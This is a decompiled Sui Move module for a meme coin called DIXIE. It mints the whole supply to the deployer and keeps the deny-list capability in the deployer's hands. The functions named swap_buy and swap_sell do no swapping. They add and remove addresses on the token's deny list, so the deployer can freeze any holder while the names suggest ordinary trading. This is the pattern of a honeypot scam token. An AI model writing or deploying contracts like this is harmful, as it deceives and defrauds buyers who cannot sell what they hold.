module 0x4414c5fbb909c987134c88f3679e9f4016cf2b40ff5e9afbe0bf26f66ec5efe::dixie {
    struct DIXIE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DIXIE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DIXIE>(arg0, 9, b"DIXIE", b"JUSTICEFORDIXIE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRP7pCSmAVJXhRm1rS2mCK6xjsKXhCo1VwUKE5MCkGvSz"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DIXIE>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DIXIE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DIXIE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DIXIE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DIXIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DIXIE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DIXIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DIXIE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

